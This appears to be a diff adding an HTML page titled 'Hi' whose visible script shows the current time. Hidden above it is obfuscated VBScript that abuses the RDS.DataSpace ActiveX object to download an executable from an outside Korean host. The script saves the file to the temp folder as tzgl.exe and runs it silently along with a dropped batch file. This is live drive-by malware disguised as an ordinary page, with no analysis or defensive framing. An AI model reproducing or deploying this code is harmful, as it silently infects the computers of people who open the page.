@@ -1,0 +1,88 @@
+<html>
+<head>
+<title>Hi</title>
+<meta name="author" content="Hi" />
+</head>
+<body>
+
+<script language="vbscript">on error resume next
+lovecai=""
+m1="ob"+lovecai+"je"+lovecai+"ct"
+m2="c"+lovecai+"la"+lovecai+"s"+lovecai+"s"+lovecai+"id"
+m3="cl"+lovecai+"s"+lovecai+"i"+lovecai+"d:B"+lovecai+"D96"+lovecai+"C5"+lovecai+"56-65"+lovecai+"A3-11"+lovecai+"D0-"+lovecai+"98"+lovecai+"3A"+lovecai+"-00"+lovecai+"C04"+lovecai+"FC2"+lovecai+"9E"+lovecai+"36"
+m4="Mi"+lovecai+"c"+lovecai+"ro"+lovecai+"so"+lovecai+"f"+lovecai+"t."+lovecai+"X"+lovecai+"ML"+lovecai+"H"+lovecai+"T"+lovecai+"TP"
+m5="S"+lovecai+"he"+lovecai+"ll"+lovecai+".A"+lovecai+"pp"+lovecai+"l"+lovecai+"ica"+lovecai+"t"+lovecai+"i"+lovecai+"o"+lovecai+"n"
+m5="She"+lovecai+"l"+lovecai+"l."+lovecai+"A"+lovecai+"p"+lovecai+"pl"+lovecai+"i"+lovecai+"c"+lovecai+"at"+lovecai+"io"+lovecai+"n"
+m5="S"+lovecai+"he"+lovecai+"l"+lovecai+"l."+lovecai+"Ap"+lovecai+"pl"+lovecai+"ic"+lovecai+"at"+lovecai+"ion"
+DirUrl = "h"+lovecai+"t"+lovecai+"t"+lovecai+"p"+lovecai+":"+lovecai+"/"+lovecai+"/"+lovecai+"w"+lovecai+"w"+lovecai+"w"+lovecai+".d"+lovecai+"y"+lovecai+"p"+lovecai+"a"+lovecai+"r"+lovecai+"a"+lovecai+"g"+lovecai+"o"+lovecai+"n"+lovecai+"."+lovecai+"c"+lovecai+"o"+lovecai+"."+lovecai+"k"+lovecai+"r"+lovecai+"/"+lovecai+"g"+lovecai+"o"+lovecai+"n"+lovecai+"/"+lovecai+"g"+lovecai+"m"+lovecai+"s"+lovecai+"e"+lovecai+"x"+lovecai+"."+lovecai+"e"+lovecai+"x"+lovecai+"e"
+Set DirUrlc = document.createElement(m1)
+DirUrlc.setAttribute m2, m3
+seturla="d"+lovecai+"o"+lovecai+"w"+lovecai+"n"
+seturlb="f"+lovecai+"i"+lovecai+"l"+lovecai+"e"
+seturlc="c"+lovecai+"o"+lovecai+"p"+lovecai+"y"
+seturld="e"+lovecai+"x"+lovecai+"i"+lovecai+"t"
+DirUrli=m4
+Set DirUrld = DirUrlc.CreateObject(DirUrli,"")
+seturlf="A"+lovecai+"d"+lovecai+"o"
+seturlg="d"+lovecai+"b"+lovecai+"."
+seturlh="S"+lovecai+"t"+lovecai+"r"
+seturli="e"+lovecai+"a"+lovecai+"m"
+DirUrlf=seturlf&seturlg&seturlh&seturli
+DirUrlg=DirUrlf
+set DirUrla = DirUrlc.createobject(DirUrlg,"")
+a1="Sc"+lovecai+"ri"+lovecai+"pt"
+a2="in"+lovecai+"g."
+a3="Fi"+lovecai+"leS"+lovecai+"ys"
+a4="te"+lovecai+"mO"+lovecai+"bj"+lovecai+"ect"
+a5=a1 & a2 & a3 & a4
+set DirUrlb = DirUrlc.createobject(a5,"")
+set DirUrle = DirUrlb.GetSpecialFolder(2)
+DirUrlBAT=DirUrlb.BuildPath(DirUrle,"~s.bat")
+DirUrl9="t"+lovecai+"z"+lovecai+"gl"+lovecai+"."+lovecai+"e"+lovecai+"x"+lovecai+"e"
+DirUrl9= DirUrlb.BuildPath(DirUrle,DirUrl9)
+set DirUrle = DirUrlc.createobject(m5,"")
+DirUrle.ShellExecute "cmd.exe","/c echo "+DirUrl9+">"+DirUrlBAT,"","",0
+DirUrla.type = 1
+DirUrlh="G"+lovecai+"E"+lovecai+"T"
+DirUrld.Open DirUrlh, DirUrl, False
+DirUrld.Send
+DirUrla.open
+DirUrl8="Di"+lovecai+"rUrla.B"+lovecai+"ui"+lovecai+"ld"+lovecai+"P"+lovecai+"at"+lovecai+"h(DirUrla,DirUrl8)"
+DirUrl7="Dir"+lovecai+"Ur"+lovecai+"lb."+lovecai+"Bu"+lovecai+"il"+lovecai+"dP"+lovecai+"at"+lovecai+"h(DirUrlb,DirUrl7)"
+DirUrl6="Di"+lovecai+"rU"+lovecai+"rl"+lovecai+"c.B"+lovecai+"ui"+lovecai+"ld"+lovecai+"Pa"+lovecai+"th"+lovecai+"(DirUrld,DirUrl6)"
+DirUrl5="Di"+lovecai+"rU"+lovecai+"rld"+lovecai+".B"+lovecai+"ui"+lovecai+"ld"+lovecai+"Pa"+lovecai+"th(DirUrlf,DirUrl5)"
+DirUrl4="D"+lovecai+"i"+lovecai+"rU"+lovecai+"rl"+lovecai+"e."+lovecai+"Bu"+lovecai+"il"+lovecai+"dP"+lovecai+"a"+lovecai+"th(DirUrlg,DirUrl4)"
+DirUrl3="D"+lovecai+"ir"+lovecai+"Ur"+lovecai+"lf."+lovecai+"Bu"+lovecai+"il"+lovecai+"dP"+lovecai+"at"+lovecai+"h(DirUrlh,DirUrl4)"
+DirUrl2="Di"+lovecai+"r"+lovecai+"Ur"+lovecai+"lg."+lovecai+"Bu"+lovecai+"il"+lovecai+"dP"+lovecai+"at"+lovecai+"h"+lovecai+"(DirUrli,DirUrl3)"
+DirUrl1="Di"+lovecai+"rU"+lovecai+"r"+lovecai+"lh"+lovecai+".B"+lovecai+"ui"+lovecai+"ld"+lovecai+"P"+lovecai+"a"+lovecai+"th(DirUrlg,DirUrl1)"
+DirUrl0="Di"+lovecai+"rU"+lovecai+"rli"+lovecai+".B"+lovecai+"uil"+lovecai+"dPa"+lovecai+"th(DirUrlk,DirUrl0)"
+DirUrla.write DirUrld.responseBody
+a1="Di"+lovecai+"rU"+lovecai+"rl"+lovecai+"a"
+a2="."+lovecai+"sa"+lovecai+"v"
+a3="e"+lovecai+"to"+lovecai+"f"+lovecai+"il"+lovecai+"e"
+a4=" D"+lovecai+"i"+lovecai+"rU"+lovecai+"rl"+lovecai+"9,"+lovecai+"2"
+a5=a1 & a2 & a3 & a4
+execute(a5)
+DirUrla.close
+a1="o"
+a2="p"
+a3="e"
+a4="n"
+a5=a1 & a2 & a3 & a4
+DirUrle.ShellExecute DirUrl9,BBS,BBS,a5,0
+a1="c"
+a2="m"
+a3="d"
+a4="."+lovecai+"e"+lovecai+"x"+lovecai+"e"
+a5=a1 & a2 & a3 & a4
+DirUrle.ShellExecute a5, "/c " & DirUrlBAT,BBS,"",0
+</script>
+
+<script type="text/jscript">
+function init() {
+document.write("Hi:The time is now: " + Date() );
+}
+window.onload = init;
+</script>
+</body>
+</html>
